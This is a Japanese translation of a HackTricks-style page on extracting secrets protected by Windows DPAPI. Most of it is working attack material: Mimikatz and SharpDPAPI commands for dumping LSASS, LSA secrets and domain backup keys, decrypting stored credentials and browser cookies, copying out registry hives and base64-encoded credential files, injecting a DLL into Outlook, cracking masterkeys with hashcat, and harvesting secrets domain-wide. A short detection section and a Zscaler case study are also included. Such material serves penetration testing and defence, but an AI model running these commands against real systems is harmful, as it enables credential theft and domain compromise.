# DPAPI - PasswordsのExtracting

{{#include ../../banners/hacktricks-training.md}}



## DPAPIとは

Data Protection API（DPAPI）は、主にWindows operating system内で、**asymmetric private keysのsymmetric encryption**に利用されます。重要なentropyのソースとして、ユーザーまたはsystemのsecretを使用します。この方式では、ユーザーのlogon secretから導出したkey、またはsystem encryptionの場合はsystemのdomain authentication secretを使ってdataをencryptできるため、開発者はencryption key自体の保護を管理する必要がなくなり、encryptionが簡単になります。

DPAPIを使用する最も一般的な方法は、**`CryptProtectData`および`CryptUnprotectData`** functionsを介する方法です。これらにより、applicationsは現在log onしているprocessのsecurity contextを使ってdataをencryptおよびdecryptできます。デフォルトでは、encryptした同じuserまたはsystem contextのみがdataをdecryptできます。<sup>[[2]](#references)[[3]](#references)</sup>

これらのfunctionsは、encryptionおよびdecryption中に使用されるoptionalな**entropy parameter**も受け取ります。optional entropyで保護されたdataをdecryptするには、同じentropy valueが必要です。<sup>[[2]](#references)[[6]](#references)</sup>

### Users key generation

DPAPIは、ユーザーのcredentialsからユーザー固有のvalue（一般に**pre-key**と呼ばれます）を導出します。正確な導出方法は、accountとoperating-system versionによって異なります。たとえばImpacketは、passwordのUTF-16LE digestに基づくSHA-1のHMAC path、passwordのMD4/NT hashに基づく別のpath、そしてProtected Users向けのPBKDF2-SHA256-derived pathを試します。そのためoffline toolingは、plaintext passwordまたは利用可能なNT hashのいずれかから、必要なmaterialを導出できることが多くなります。<sup>[[2]](#references)[[10]](#references)</sup>

これは特に興味深い点です。攻撃者がユーザーのpassword hashを取得できる場合、次のことが可能になります。

- そのユーザーのkeyを使用して**DPAPIでencryptされた任意のdataをdecrypt**する。APIへの接続は不要
- 有効なDPAPI keyを生成できるか試行しながら、**passwordをofflineでcrack**する

DPAPIは、保護されたblobごとに新しいmaster keyを作成するのではなく、各ユーザーに対して1つ以上の**master keys**を保持します。各master keyには**GUID**（Globally Unique Identifier）があり、encrypted blobには、それを保護するmaster keyが記録されています。<sup>[[2]](#references)</sup>

Master keysは、**`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directoryに保存されます。ここで`{SID}`はユーザーのSecurity Identifierです。master-key fileには、ユーザーの**pre-key**によって保護されたmaterialと、domain userの場合は**domain backup key**によって保護されたrecovery materialが含まれます。<sup>[[2]](#references)</sup>

なお、master keyのencryptに使用される**domain keyはdomain controllersに存在し、変更されることがありません**。そのため、攻撃者がdomain controllerにアクセスできる場合、domain backup keyを取得して、domain内のすべてのユーザーのmaster keysをdecryptできます。<sup>[[2]](#references)</sup>

Encrypted blobsには、dataのencryptに使用された**master keyのGUID**がheader内に含まれています。

> [!TIP]
> DPAPI encrypted blobsは**`01 00 00 00`**で始まります。

Master keysを検索します：
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
ユーザーの Master Keys 一式は次のようになります：

![DPAPI とは - ユーザーキーの生成：ユーザーの Master Keys 一式は次のようになります](<../../images/image (1121).png>)

### Machine/System key の生成

これは、machine がデータを暗号化するために使用する key です。**DPAPI_SYSTEM LSA secret** に基づいており、SYSTEM user だけがアクセスできる特別な key です。この key は、machine-level credentials や system-wide secrets など、system 自体からアクセスする必要があるデータの暗号化に使用されます。<sup>[[2]](#references)</sup>

これらの key には **domain backup がない** ため、ローカルでのみアクセス可能です：

- **Mimikatz** は、次の command で LSA secrets を dump してアクセスできます：`mimikatz lsadump::secrets`
- この secret は registry 内に保存されているため、administrator は **アクセスできるように DACL permissions を変更できます**。registry path は次のとおりです：`HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- registry hives から offline extraction を行うことも可能です。たとえば、target 上で administrator として hives を保存し、exfiltrate します：
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
次に、分析用ボックスで hives から DPAPI_SYSTEM LSA secret を復元し、それを使用して machine-scope blobs（scheduled task のパスワード、service credentials、Wi‑Fi profiles など）を復号します。
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### DPAPIによって保護されるデータ

DPAPIによって保護される個人データには、以下が含まれます。

- Windows creds
- Internet ExplorerおよびGoogle Chromeのパスワードと自動入力データ
- OutlookやWindows Mailなどのアプリケーションのメールおよび内部FTPアカウントのパスワード
- 共有フォルダー、リソース、ワイヤレスネットワーク、Windows Vaultのパスワード（暗号化キーを含む）
- リモートデスクトップ接続、.NET Passportのパスワード、およびさまざまな暗号化・認証用途の秘密鍵
- Credential Managerで管理されるネットワークパスワード、およびCryptProtectDataを使用するアプリケーション（Skype、MSN messengerなど）の個人データ
- レジストリ内の暗号化されたblob
- ...

システムによって保護されるデータには、以下が含まれます。
- Wifiパスワード
- Scheduled taskのパスワード
- ...

### Master keyの抽出方法

- ユーザーがdomain admin権限を持っている場合、**domain backup key**にアクセスして、ドメイン内のすべてのユーザーのMaster keyを復号できます。
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- ローカル admin 権限があれば、接続中のすべてのユーザーの DPAPI master keys と SYSTEM key を抽出するために **LSASS memory にアクセス**できます。
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- ユーザーがローカル管理者権限を持っている場合、**DPAPI_SYSTEM LSA secret** にアクセスして、マシンの master keys を復号できます：
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- ユーザーのパスワードまたは NTLM hash が既知の場合、**ユーザーの master keys を直接 decrypt できます**。
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- ユーザーとしてセッションに入っている場合、**RPC を使用して master keys を復号するための backup key を DC に要求**できます。local admin で、ユーザーがログインしている場合は、これに使用するために**ユーザーの session token を盗む**ことができます:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault の一覧表示
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPIで暗号化されたデータへのアクセス

### DPAPIで暗号化されたデータを探す

一般ユーザーが**保護したファイル**は、以下にあります。

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 上記のパスの `\Roaming\` を `\Local\` に変更したパスも確認してください。

列挙の例:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)は、ファイルシステム、レジストリ、およびB64 blobs内のDPAPIで暗号化されたblobを検出できます:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
同じ repo に含まれる [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) を使用すると、cookies などの DPAPI で保護された機密データを復号できることに注意してください。<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron の簡易レシピ（SharpChrome）

- 現在のユーザーによる、保存された logins/cookies の対話的な復号（ユーザーコンテキストで実行すると、ユーザーの Credential Manager から追加キーが解決されるため、Chrome 127 以降の app-bound cookies でも動作します）：
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- ファイルしかない場合の Offline analysis。まず profile の "Local State" から AES state key を抽出し、それを使用して cookie DB を復号します：
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- DPAPI domain backup key (PVK) と対象ホストの管理者権限がある場合のドメイン全体/リモート triage：
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- ユーザーの DPAPI prekey/credkey（LSASS から取得）を持っている場合、password cracking を省略して profile data を直接復号できます:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
注記
- 新しい Chrome/Edge ビルドでは、特定の cookie が "App-Bound" encryption を使用して保存される場合があります。追加の app-bound key がなければ、これらの特定の cookie を offline decryption することはできません。対象ユーザーのコンテキストで SharpChrome を実行すると、自動的に取得できます。詳細については、以下で参照している Chrome security blog post を参照してください。<sup>[[5]](#references)</sup>

### Access keys and data

- **SharpDPAPI を使用して、現在のセッションから DPAPI encrypted files の credentials を取得します:**
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **認証情報を取得**: 暗号化データや guidMasterKey など。<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **masterkeyへのアクセス**:

RPCを使用して、**domain backup key**を要求しているユーザーのmasterkeyを復号します：
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** tool は、masterkey の復号化に以下の引数もサポートしています（`/rpc` を使用してドメインの backup key を取得したり、`/password` を使用して plaintext password を指定したり、`/pvk` を使用して DPAPI domain private key file を指定したりできる点に注目してください...）：<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **masterkeyを使用してデータを復号化**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI** tool は、`credentials|vaults|rdg|keepass|triage|blob|ps` の復号化で次の引数もサポートしています（`/rpc` を使用してドメインの backup key を取得したり、`/password` を使用して plaintext password を指定したり、`/pvk` を使用して DPAPI domain private key file を指定したり、`/unprotect` を使用して current user の session を使用したりできる点に注目してください）：<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- DPAPI prekey/credkeyを直接使用する（パスワード不要）

LSASSをdumpできる場合、Mimikatzでは、平文のパスワードを知らなくてもユーザーのmasterkeysを復号できる、logonごとのDPAPI keyが表示されることがあります。この値をtoolingに直接渡します:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- **現在のユーザーセッション**を使用して一部のデータを復号する：
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Impacket dpapi.pyによるオフライン復号

被害者ユーザーのSIDとパスワード（またはNT hash）があれば、Impacketのdpapi.pyを使用して、DPAPI masterkeysとCredential Manager blobsを完全にオフラインで復号できます。<sup>[[10]](#references)[[11]](#references)</sup>

- ディスク上のartefactsを特定します:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- 対応するmasterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- ファイル転送toolingが不安定な場合は、ホスト上でファイルをbase64化し、出力をコピーします:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- ユーザーの SID と password/hash を使用して masterkey を復号する：
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- 復号済みの masterkey を使用して credential blob を復号する：
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
このワークフローでは、Windows Credential Manager を使用してアプリケーションが保存したドメイン資格情報（管理者アカウント（例: `*_adm`）を含む）を取得できることがよくあります。

---

### Optional Entropy（"Third-party entropy"）の処理

一部のアプリケーションは、`CryptProtectData` に追加の **entropy** 値を渡します。この値がない場合、正しい masterkey が分かっていても blob を復号できません。そのため、この方法で保護された資格情報（Microsoft Outlook や一部の VPN クライアントなど）を対象とする場合、entropy の取得が不可欠です。

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture)（2022）は、対象プロセス内の DPAPI 関数にフックし、指定された optional entropy を透過的に記録する user-mode DLL です。`outlook.exe` や `vpnclient.exe` などのプロセスに対して **DLL-injection** mode で EntropyCapture を実行すると、各 entropy buffer を呼び出し元のプロセスおよび blob に対応付けたファイルが出力されます。取得した entropy は、後で **SharpDPAPI**（`/entropy:`）または **Mimikatz**（`/entropy:<file>`）に渡してデータを復号できます。<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### masterkeyをオフラインでcrackする（Hashcat & DPAPISnoop）

Microsoftは、Windows 10 v1607（2016）以降、**context 3** masterkey formatを導入しました。`hashcat` v6.2.6（2023年12月）では、hash-modes **22100**（DPAPI masterkey v1 context ）、**22101**（context 1）、**22102**（context 3）が追加され、masterkey fileからユーザーのpasswordを直接GPU-accelerated crackingできるようになりました。そのため、攻撃者はtarget systemとやり取りせずに、word-listまたはbrute-force attacksを実行できます。<sup>[[7]](#references)</sup>

`DPAPISnoop`（2024）は、このprocessを自動化します：
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
この tool は Credential および Vault blobs も parse でき、cracked keys で decrypt して cleartext passwords を export できます。<sup>[[8]](#references)</sup>


### 他のマシンのデータへのアクセス

**SharpDPAPI and SharpChrome** では、**`/server:HOST`** option を指定して remote machine の data に access できます。当然、その machine に access できる必要があり、以下の例では **domain backup encryption key が known である**ことを前提としています。
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## その他のツール

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) は、LDAP directory からすべてのユーザーとコンピューターを抽出し、RPC 経由で domain controller の backup key を抽出する処理を自動化するツールです。続いてスクリプトは、すべてのコンピューターの IP address を解決し、全コンピューターに対して smbclient を実行して、全ユーザーの DPAPI blobs を取得し、domain backup key ですべてを復号します。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP から抽出したコンピューターリストを使えば、把握していなかった場合でもすべてのサブネットワークを見つけられます！

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) は、DPAPI で保護された secrets を自動的に dump できます。2.x release では次の機能が導入されました。<sup>[[9]](#references)</sup>

* 数百の host から blobs を並列収集
* **context 3** masterkeys の parsing と Hashcat cracking integration の自動化
* Chrome の「App-Bound」encrypted cookies に対応（次のセクションを参照）
* endpoint を繰り返し poll し、新しく作成された blobs との差分を取得する新しい **`--snapshot`** mode

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) は、masterkey/credential/vault files 用の C# parser です。Hashcat/JtR formats を出力でき、オプションで cracking を自動的に実行できます。Windows 11 24H1 までの machine および user masterkey formats を完全にサポートしています。<sup>[[8]](#references)</sup>


## 一般的な検知

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` およびその他の DPAPI-related directories 内の files へのアクセス。
- 特に **C$** や **ADMIN$** などの network share 経由のアクセス。
- **Mimikatz**、**SharpDPAPI** または類似の tooling を使用した LSASS memory へのアクセスや masterkeys の dump。
- Event **4662**: *An operation was performed on an object* – **`BCKUPKEY`** object へのアクセスと相関付けることができます。
- process が *SeTrustedCredManAccessPrivilege* (Credential Manager) を要求した際の Event **4673/4674**。

---
### 2023-2025 の vulnerabilities と ecosystem の変化

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (2023 年 11 月)。network access を持つ attacker は、domain member を欺いて malicious DPAPI backup key を取得させ、user masterkeys を復号できました。2023 年 11 月の cumulative update で patch 済みです。administrators は DC と workstations に最新の patch が完全に適用されていることを確認してください。<sup>[[4]](#references)</sup>
* **Chrome 127 の「App-Bound」cookie encryption** (2024 年 7 月) は、legacy の DPAPI-only protection を、user の **Credential Manager** に保存される追加の key に置き換えました。cookies の offline decryption には、DPAPI masterkey と **GCM-wrapped app-bound key** の両方が必要になりました。SharpChrome v2.3 と DonPAPI 2.x は、user context で実行した場合に追加の key を recover できます。<sup>[[5]](#references)</sup>


### Case Study: Zscaler Client Connector – SID から導出される Custom Entropy

Zscaler Client Connector は、複数の configuration files を `C:\ProgramData\Zscaler`（例: `config.dat`、`users.dat`、`*.ztc`、`*.mtt`、`*.mtc`、`*.mtp`）に保存します。各 file は **DPAPI (Machine scope)** で暗号化されていますが、vendor は disk 上に保存する代わりに、*runtime で計算される* **custom entropy** を提供しています。<sup>[[1]](#references)</sup>

entropy は次の 2 つの要素から再構築されます。

1. `ZSACredentialProvider.dll` 内に埋め込まれた hard-coded secret。
2. configuration が属する Windows account の **SID**。

DLL に実装された algorithm は、次と同等です。
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
秘密がディスクから読み取れる DLL に埋め込まれているため、**SYSTEM 権限を持つローカル攻撃者は、任意の SID のエントロピーを再生成し、blob をオフラインで復号できます**。
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
復号すると完全な JSON 設定が得られます。これにはすべての **device posture check** とその期待値が含まれており、client-side bypass を試みる際に非常に価値のある情報です。

> TIP: その他の暗号化された artefact（`*.mtt`、`*.mtp`、`*.mtc`、`*.ztc`）は、entropy なし（`16` 個のゼロバイト）で DPAPI によって保護されています。そのため、SYSTEM 権限を取得すれば `ProtectedData.Unprotect` で直接復号できます。

## References

- [1] [Synacktiv – zero trust を信頼すべきか？Zscaler の posture check を bypass する](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets。DPAPI におけるセキュリティ分析とデータ復旧](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Mimikatz と C++ を使用した DPAPI Encrypted Secrets の読み取り](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI（Data Protection Application Programming Interface）Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Windows における Chrome cookies のセキュリティ向上](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: DPAPI Optional Entropy の簡単な抽出](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 リリースノート](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub リポジトリ](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI プロジェクトページ](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse、KeePassXC Argon2 cracking、および DPAPI decryption による DC admin 権限取得](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – 使用方法とオプション](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
